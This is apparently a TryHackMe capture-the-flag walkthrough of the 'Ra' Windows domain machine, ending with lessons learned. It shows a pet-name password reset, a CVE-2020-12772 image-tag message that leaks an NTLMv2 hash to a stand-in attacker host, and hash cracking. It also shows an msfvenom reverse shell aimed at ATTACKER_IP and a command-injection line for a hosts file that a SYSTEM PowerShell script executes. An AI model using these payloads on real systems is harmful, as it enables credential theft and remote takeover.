# Ra — TryHackMe Hard

**IP:** `10.129.179.230`
**Domain:** `windcorp.thm` / `fire.windcorp.thm`
**OS:** Windows Server 2019
**Platform:** TryHackMe — Hard
**Tech Stack:** IIS 10, Openfire XMPP 4.5.1, Spark 2.8.3, Active Directory, WinRM

---

## Attack Chain Overview

```
Nmap → Openfire XMPP + IIS on fire.windcorp.thm
  → Password reset form leaks vhost
  → Website scraping finds employee photo → pet name (Sparky)
  → Reset lilyle's password via security question
  → SMB as lilyle → Spark 2.8.3 installer + Users share
  → CVE-2020-12772: img tag in XMPP chat → Responder captures buse's NTLMv2
  → John cracks hash → buse:uzunLM+3131
  → WinRM as buse → Flag 2
  → BloodHound: buse ∈ Account Operators → GenericAll over brittanycr
  → checkservers.ps1 (SYSTEM) reads brittanycr/hosts.txt via Invoke-Expression
  → Change brittanycr's password → write malicious hosts.txt via SMB
  → Wait for scheduled execution → SYSTEM shell → Flag 3
```

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [SMB Enumeration](#3-smb-enumeration)
4. [Initial Access — CVE-2020-12772 NTLM Capture](#4-initial-access--cve-2020-12772-ntlm-capture)
5. [User Flag — buse](#5-user-flag--buse)
6. [Privilege Escalation — Account Operators → SYSTEM](#6-privilege-escalation--account-operators--system)
7. [Root Flag](#7-root-flag)
8. [Key Takeaways](#8-key-takeaways)
9. [Related Notes](#9-related-notes)

---

## 1. Reconnaissance

```bash
silent-scan $TARGET
nmap -sVC -p53,80,135,139,445,5222,5223,5269,5276,7777,9389,49676 $TARGET -oN service
```

**Output**
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Windcorp.
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5222/tcp  open  jabber        Ignite Realtime Openfire Jabber server 3.10.0 or later
|_ssl-date: 2026-06-07T12:52:57+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
5223/tcp  open  ssl/jabber
5269/tcp  open  xmpp          Wildfire XMPP Client
5276/tcp  open  ssl/jabber
7777/tcp  open  socks5        (No authentication; connection failed)
9389/tcp  open  mc-nmf        .NET Message Framing
49676/tcp open  msrpc         Microsoft Windows RPC

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

**Initial findings:**
- IIS on port 80 — corporate website for `windcorp.thm`
- **Openfire XMPP** on ports 5222/5223/5269/5276 — `fire.windcorp.thm` as CN
- Port 7777: unauthenticated SOCKS5 proxy (connection fails)
- DNS on 53 — zone transfer worth attempting
- Standard AD ports (135, 139, 445, 9389)

Add the domain and vhost to `/etc/hosts`:
```bash
echo "$TARGET windcorp.thm fire.windcorp.thm" >> /etc/hosts
```

---

## 2. Web Enumeration

### Password Reset Page Leaks the Vhost

Navigating to the main site and clicking the password reset link reveals a redirect to:

```
http://fire.windcorp.thm/reset.asp
```

This confirms the vhost `fire.windcorp.thm`. The reset form asks for a **username** and
a **favourite pet name** as the security question — OSINT bait.

### DNS Zone Transfer

```bash
dig @$TARGET windcorp.thm ANY
```

**Output**
```
; ANSWER SECTION:
windcorp.thm.     600   IN  A    192.168.16.27
windcorp.thm.     3600  IN  NS   fire.windcorp.thm.
windcorp.thm.     3600  IN  SOA  fire.windcorp.thm. hostmaster.windcorp.thm. ...

;; ADDITIONAL SECTION:
fire.windcorp.thm.  3600  IN  A  192.168.112.1
fire.windcorp.thm.  3600  IN  A  10.129.179.230
```

No additional hostnames from the transfer, but it confirms the machine is the DNS server.

### Openfire Admin Panel

Navigating to `http://fire.windcorp.thm:9090` reveals an **Openfire 4.5.1** admin login.
This version is vulnerable to CVE-2020-12772 — noted for later.

### Directory Brute-Forcing

```bash
gobuster dir -u http://fire.windcorp.thm \
  -w /usr/share/wordlists/dirb/common.txt \
  -x asp,aspx,txt,bak,old
```

No high-value paths found, but browsing the root page manually is more useful.

### OSINT on the Homepage — Employee Names and Pet Photo

The homepage lists employees, including a photo of **Lily Levesque** with her dog.
Inspecting the image source in DevTools reveals the filename:

```
src="img/lilyleAndSparky.jpg"
```

The filename encodes both the username (`lilyle`) and the pet name (`Sparky`).

### Password Reset via Security Question

Navigate to `http://fire.windcorp.thm/check.asp` and submit:

- **Username:** `lilyle`
- **Favourite pet name:** `Sparky`

**Response:**
```
Your password has been reset to: ChangeMe#1234
```

### Scraping Employee Emails

Clone the website to extract all email addresses embedded in the HTML:

```bash
httrack "http://fire.windcorp.thm" -o /tmp/windcorp
grep -r "@fire.windcorp.thm" /tmp/windcorp --include="*.html" -h | grep -o '[a-zA-Z0-9._-]*@fire\.windcorp\.thm' | sort -u
```

**Extracted emails:**
```
angrybird253@fire.windcorp.thm
brownostrich284@fire.windcorp.thm
buse@fire.windcorp.thm
Edeltraut@fire.windcorp.thm
Edward@fire.windcorp.thm
Emile@fire.windcorp.thm
goldencat416@fire.windcorp.thm
happymeercat399@fire.windcorp.thm
lily@fire.windcorp.thm
orangegorilla428@fire.windcorp.thm
organicfish718@fire.windcorp.thm
organicwolf509@fire.windcorp.thm
sadswan869@fire.windcorp.thm
tinywolf424@fire.windcorp.thm
tinygoose102@fire.windcorp.thm
whiteleopard529@fire.windcorp.thm
```

This gives a full user list for later attacks.

---

## 3. SMB Enumeration

### Validate Credentials

```bash
netexec smb $TARGET -u lilyle -p 'ChangeMe#1234'
netexec smb $TARGET -u lilyle -p 'ChangeMe#1234' --shares
```

**Output**
```
SMB  10.129.179.230  445  FIRE  [*] Windows 10 / Server 2019 Build 17763 x64
                                    (name:FIRE) (domain:windcorp.thm)
                                    (signing:True) (SMBv1:None)
SMB  10.129.179.230  445  FIRE  [+] windcorp.thm\lilyle:ChangeMe#1234
```

### Browse the Shared Share

```bash
smbclient //$TARGET/Shared -U 'lilyle%ChangeMe#1234'
```

**Output**
```
smb: \> dir
  Flag 1.txt        A       45  Fri May  1 15:32:36 2020
  spark_2_8_3.deb   A 29526628  Sat May 30 00:45:01 2020
  spark_2_8_3.dmg   A 99555201  Sun May  3 11:06:58 2020
  spark_2_8_3.exe   A 78765568  Sun May  3 11:05:56 2020
  spark_2_8_3.tar.gz A 123216290 Sun May  3 11:07:24 2020
```

The `Shared` share contains **Spark 2.8.3** installers — the Openfire XMPP client.
Version 2.8.3 is vulnerable to **CVE-2020-12772** (NTLM hash leak via rogue image tag).

### Browse the Users Share

```bash
smbclient //$TARGET/Users -U 'lilyle%ChangeMe#1234'
smb: \> dir
```

**Active users (recently accessed):**
```
buse            → Sun Jun  7 12:51:28 2026  ← ACTIVE
goldencat416    → Sun Jun  7 13:51:05 2026  ← ACTIVE
organicfish718  → Sun Jun  7 13:51:59 2026  ← ACTIVE
sadswan869      → Sun Jun  7 13:47:28 2026  ← ACTIVE
```

Active directories in the Users share suggest these accounts are interacting with the
system. `buse` is a named user (vs. the random-looking names) — a good target.

---

## 4. Initial Access — CVE-2020-12772 NTLM Capture

### The Vulnerability

Spark 2.8.3 does not sanitise `<img>` tags sent in XMPP chat messages. When a user
with Spark open receives a message containing an `<img src="http://attacker/x">` tag,
Spark automatically fetches the URL — sending a **NTLMv2 authentication challenge**
to the attacker's HTTP server.

Reference: [CVE-2020-12772 PoC](https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md)

### Setup

Download and install Spark 2.8.3 from the SMB share:

```bash
smbclient //$TARGET/Shared -U 'lilyle%ChangeMe#1234' -c "get spark_2_8_3.tar.gz"
tar -xzf spark_2_8_3.tar.gz
cd Spark && ./Spark
```

In the Spark settings, **disable certificate validation** before logging in, then
authenticate as `lilyle` / `ChangeMe#1234` against `fire.windcorp.thm`.

### Capture the NTLMv2 Hash

Start Responder on the attacking interface:

```bash
sudo responder -I tun0 -v
```

Open a chat with `buse@fire.windcorp.thm` and send the malicious image tag:

```xml
<img src="http://ATTACKER_IP/test.img">
```

When Spark on buse's machine pre-fetches the image, Responder intercepts the NTLM
authentication handshake and captures the NTLMv2 hash:

```
[HTTP] NTLMv2 Client   : 10.129.179.230
[HTTP] NTLMv2 Username : WINDCORP\buse
[HTTP] NTLMv2 Hash     : buse::WINDCORP:6ea63dd58f11bdbf:9F4B44E85AADF9628CAE96D1CF0A7CED:0101...
```

### Crack the Hash

```bash
echo 'buse::WINDCORP:6ea63dd58f11bdbf:9F4B44E85AADF9628CAE96D1CF0A7CED:01010000000000001D2A7F528CF6DC0131C1EC89D616C3CE00000000020008005A0045004700460001001E00570049004E002D004100490033005100590047004F004C00360053004900040014005A004500470046002E004C004F00430041004C0003003400570049004E002D004100490033005100590047004F004C003600530049002E005A004500470046002E004C004F00430041004C00050014005A004500470046002E004C004F00430041004C00080030003000000000000000010000000020000040E44E20F88843A93486F1439255F5479141586DEFBCA671F97933887452D30E0A00100000000000000000000000000000000000090000000000000000000000' > hash_ntlm.txt

john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash_ntlm.txt
```

**Output**
```
buse:uzunLM+3131
```

---

## 5. User Flag — buse

Verify WinRM access and connect:

```bash
netexec winrm $TARGET -u buse -p 'uzunLM+3131'
evil-winrm -i $TARGET -u buse -p 'uzunLM+3131'
```

```powershell
*Evil-WinRM* PS C:\Users\buse\Desktop> type "Flag 2.txt"
```

While on the Desktop, also note a `Stuff\Passwords` directory:

```powershell
*Evil-WinRM* PS C:\Users\buse\Desktop\Stuff\Passwords> dir
-a---- 5/7/2020  2:58 AM   Facebook.txt

*Evil-WinRM* PS C:\Users\buse\Desktop\Stuff\Passwords> type Facebook.txt
password
```

---

## 6. Privilege Escalation — Account Operators → SYSTEM

### BloodHound Enumeration

Run bloodhound-python from the attacker machine to map AD relationships:

```bash
bloodhound-python \
  -d windcorp.thm \
  -u buse \
  -p 'uzunLM+3131' \
  -ns $TARGET \
  -c All \
  --zip
```

**Key finding:** `buse` is a member of the **Account Operators** group, which has
**GenericAll** over the user `brittanycr`. Account Operators can change any non-admin
user's password without knowing the current one.

### Discovering the Scheduled Script

On the target, a scheduled PowerShell script runs periodically:

```
C:\scripts\checkservers.ps1
C:\scripts\log.txt
```

The `log.txt` timestamp matches the current date — the script runs automatically,
likely as `SYSTEM` or `Administrator`.

### Analysing the Script — Injection Point

`checkservers.ps1` reads hostnames from `C:\Users\brittanycr\hosts.txt` and passes
them to `Invoke-Expression`:

```powershell
$p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
Invoke-Expression $p
```

`Invoke-Expression` executes the string as PowerShell code. If we control the content
of `hosts.txt`, we control what the script runs as SYSTEM.
The injection pattern: `localhost; <arbitrary PowerShell>`.

### Taking Over brittanycr

As a member of Account Operators, buse can reset brittanycr's password:

```bash
evil-winrm -i $TARGET -u buse -p 'uzunLM+3131'
net user brittanycr Password123! /domain
```

Verify SMB access (WinRM is not allowed for this account):

```bash
netexec smb $TARGET -u brittanycr -p 'Password123!'
```

### Building and Uploading the Payload

Generate a reverse shell executable:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=ATTACKER_IP LPORT=1337 \
  -f exe -o /tmp/shell.exe
```

Upload the shell binary and the malicious `hosts.txt` to brittanycr's SMB home
directory (which `checkservers.ps1` reads from):

```bash
# Upload the reverse shell binary
smbclient //$TARGET/Users \
  -U 'brittanycr%Password123!' \
  -c "cd brittanycr; put /tmp/shell.exe shell.exe"

# Create the injection payload
echo 'localhost; C:\Users\brittanycr\shell.exe' > /tmp/hosts.txt

# Upload the malicious hosts.txt
smbclient //$TARGET/Users \
  -U 'brittanycr%Password123!' \
  -c "cd brittanycr; put /tmp/hosts.txt hosts.txt"
```

### Wait for Execution

Start the listener and wait approximately 45 seconds for `checkservers.ps1` to run:

```bash
rlwrap nc -lvnp 1337
```

When the script fires, the shell executes as SYSTEM:

```
whoami
nt authority\system
```

---

## 7. Root Flag

```powershell
C:\Users\Administrator\Desktop> type Flag3.txt
```

---

## 8. Key Takeaways

1. **Pet names in image filenames are OSINT gold.** The filename `lilyleAndSparky.jpg`
   combined with a pet-name security question was the entire initial foothold.
   Always inspect every image `src` attribute on corporate sites.

2. **CVE-2020-12772 works because XMPP clients auto-fetch image tags.** Spark 2.8.3
   does not validate whether the image origin is trusted, so any chat participant can
   trigger an outbound NTLM handshake from the victim's machine — no click required.

3. **Account Operators is a highly privileged group.** It can reset passwords for
   any non-admin user in the domain. A foothold on a member account is often enough
   to pivot laterally into any non-privileged user's session.

4. **`Invoke-Expression` on user-controlled file content equals RCE.** Any scheduled
   task or service that reads a file from a user-writable location and executes its
   content is a privilege escalation waiting to happen. Semicolons break out of
   PowerShell string context trivially.

5. **Check SMB write access even when WinRM is denied.** `brittanycr` had no WinRM
   access but full write access to their own SMB home directory — which is all
   that was needed to plant the payload.

---

## 9. Related Notes

- [`../../tools/recon/nmap.md`](../../tools/recon/nmap.md)
- [`../../tools/recon/netexec.md`](../../tools/recon/netexec.md)
- [`../../tools/recon/smbclient.md`](../../tools/recon/smbclient.md)
- [`../../tools/recon/bloodhound.md`](../../tools/recon/bloodhound.md)
- [`../../tools/fuzz/gobuster.md`](../../tools/fuzz/gobuster.md)
- [`../../tools/web/httrack.md`](../../tools/web/httrack.md)
- [`../../tools/creds/responder.md`](../../tools/creds/responder.md)
- [`../../tools/creds/john.md`](../../tools/creds/john.md)
- [`../../tools/exploitation/evil-winrm.md`](../../tools/exploitation/evil-winrm.md)
- [`../../tools/exploitation/msfvenom.md`](../../tools/exploitation/msfvenom.md)
- [`../../exploits/web-disclosure/xmpp-spark-ntlm-leak.md`](../../exploits/web-disclosure/xmpp-spark-ntlm-leak.md)
- [`../../privesc/windows/invoke-expression-file-injection.md`](../../privesc/windows/invoke-expression-file-injection.md)